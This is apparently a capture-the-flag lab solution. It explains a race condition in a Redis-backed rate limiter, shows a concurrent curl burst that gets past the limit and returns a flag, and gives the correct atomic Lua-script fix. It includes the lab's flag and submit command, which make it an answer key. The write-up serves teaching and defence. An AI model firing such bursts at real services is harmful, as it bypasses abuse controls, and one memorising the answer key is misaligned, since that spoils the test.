# w09 Rate Limit Ghost :: solution

## Root cause

`app/server.py`, `_metered()` — the entire check-then-act:

```python
key = _key(client)

# --- check ---------------------------------------------------------------
# A snapshot of the counter, taken on its own round trip to Redis.
used = int(R.get(key) or 0)

if used >= LIMIT:
    ...

# ponytail: deliberate check-then-act window, makes the race deterministic.
time.sleep(SLEEP_MS / 1000.0)

# --- act ----------------------------------------------------------------
# Atomic on its own - but atomic against other INCRBYs only. It cannot
# retroactively invalidate the check that already read the old value.
after = R.incrby(key, 1)
```

The budget is enforced by exactly one thing: the `used >= LIMIT` comparison on a
value returned by an earlier `GET`. That value is a **snapshot**, and nothing
carries it forward to the `INCRBY`:

- `GET` and `INCRBY` are two separate commands on two separate round trips;
- `INCRBY` is atomic — but only *against other `INCRBY`s*. It serializes the
  writes perfectly and does nothing for the *decision* that was made from the
  stale read. This is the subtle half: the write is the atomic one, and the
  race is in the read;
- there is no Lua script (`EVAL`), no `MULTI`/`WATCH`, and no `INCR`-then-
  compare that would make Redis itself re-evaluate the budget atomically.

`time.sleep` is not the bug — it is a magnifier. It turns a race that would be
won only by a lucky scheduling gap on one core into one that is won **every
time, on any number of cores**, because all N handlers are parked in the same
400 ms window when the first `INCRBY` lands. That determinism is the point of
the lab: a hard race has to be reliably winnable.

The limiter is the classic "correct design, wrong implementation": the state is
correctly *shared* (Redis, so replicas agree on the counter) while the decision
is not made *atomically*. It is not a TOCTOU on a database row — the store is
an external, horizontally-scaled counter, and the missing primitive is a
compare-and-increment, not a row lock.

## Recon

The landing page states the policy and carries `<meta name="lab" content="w09">`.
The health endpoint gives the parameters you need to size the burst:

```bash
curl -s http://localhost:30009/api/health
# {"service":"rate-limit-ghost","lab":"w09","version":"1.9.0",
#  "limit":5,"window_ms":500,"store":"redis://redis:6379 (up)",...}
```

`limit` 5 and `window_ms` 500 tells you: send more than 5 requests, all of them
inside a 500 ms window, and the counter is stale for all of them.

Confirm the limiter is **actually enforced** before attacking it — otherwise a
"success" proves nothing:

```bash
for i in 1 2 3 4 5 6; do
  curl -s -X POST http://localhost:30009/api/request \
    -H 'content-type: application/json' -d '{"client":"alice"}'; echo
done
# {"ok":true,"status":"served","used_in_window":1,...}   x5
# {"ok":false,"status":"rate_limited","used_in_window":5,"limit":5,...}

curl -s 'http://localhost:30009/api/quota?client=alice'
# {"client":"alice","used_in_window":5,"limit":5,"remaining":0,"over_limit":false}
```

The control works. The bug is only in the *simultaneous* path.

## Exploit

Use a fresh window (so the burst starts from zero) and fire more requests than
the budget, concurrently:

```bash
python solution/exploit.py
```

```
[*] target  http://localhost:30009  limit=5 window_ms=500
[*] client  racer-48213907  burst=14
[*] results: 14 over-limit, 0 refused by the check
[*] final counter for racer-48213907: 14 / limit 5
[+] FLAG: hex4b0t{verifytest123456}
```

Note `0 refused by the check`: not one of the fourteen requests saw a counter at
or above the limit, even though the last ones to be *written* clearly should
have. They all read the same stale `0`.

The same thing by hand, if you want to see it without the script:

```bash
CLIENT="manual-$(date +%s)"
curl -s -X POST http://localhost:30009/api/reset \
  -H 'content-type: application/json' -d "{\"client\":\"$CLIENT\"}" >/dev/null
for i in $(seq 1 14); do
  curl -s -X POST http://localhost:30009/api/request \
    -H 'content-type: application/json' -d "{\"client\":\"$CLIENT\"}" &
done
wait
# several replies carry "status":"limit_exceeded" and a "flag" field
curl -s "http://localhost:30009/api/quota?client=$CLIENT"
# {"client":"manual-...","used_in_window":14,"limit":5,"over_limit":true}
```

The flag comes back in whichever response performed the increment that pushed
the post-increment counter past `LIMIT` — the handler re-reads *after* writing,
and that is the only place the overrun is observable.

## The fix

The instinct is to "add a lock". Where the lock goes decides whether the fix
works:

**Wrong: a lock in the application.** A `threading.Lock` around check-and-
increment closes the window — for this process. The moment a second replica
runs (which is the entire reason the counter is in Redis in the first place),
two processes hold two locks over one shared counter. The state is distributed;
the mutex is not. This is the trap the lab is built on: the naive fix looks
correct because there is one container.

**Wrong: `INCR` first, then check.** Counting first and refunding on overrun
turns "too many served" into "counter briefly too high" — except the refund is
itself a separate round trip, and the counter is now the thing racing.

The budget is a *shared invariant*, so it must be enforced by a **single atomic
operation owned by the store that holds the counter**:

**Option A — compare-and-increment in a Lua script.** Redis executes a script
atomically, so the read and the write cannot interleave:

```lua
-- KEYS[1] = counter key, ARGV[1] = limit, ARGV[2] = window ms
local used = tonumber(redis.call('GET', KEYS[1]) or '0')
if used >= tonumber(ARGV[1]) then
  return -1                              -- refused, nothing written
end
local n = redis.call('INCR', KEYS[1])
redis.call('PEXPIRE', KEYS[1], tonumber(ARGV[2]))
return n                                 -- served as request n
```

```python
script = R.register_script(LUA)
n = script(keys=[_key(client)], args=[LIMIT, WINDOW_MS])
if n == -1:
    return denied_response()
```

`-1` means refused, and because the whole thing ran under Redis's single
execution slot, no two callers can both see `used < LIMIT`.

**Option B — a sliding window via a sorted set, still scripted.** Replace the
counter with `ZADD`/`ZREMRANGEBYSCORE`/`ZCARD` inside one script; the budget
becomes a property of the set. Same shape, finer granularity.

Both options have the same shape: **one atomic operation, owned by the store
that holds the counter.** `INCRBY` is the right *verb* in the wrong *place* —
it is atomic over the write and blind to the decision.

## Flag

Injected at runtime into `W0B_FLAG`; there is no static value to hardcode. The
Redis counter is in-memory (`--save "" --appendonly no`), so windows reset on
restart and the flag does not change.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
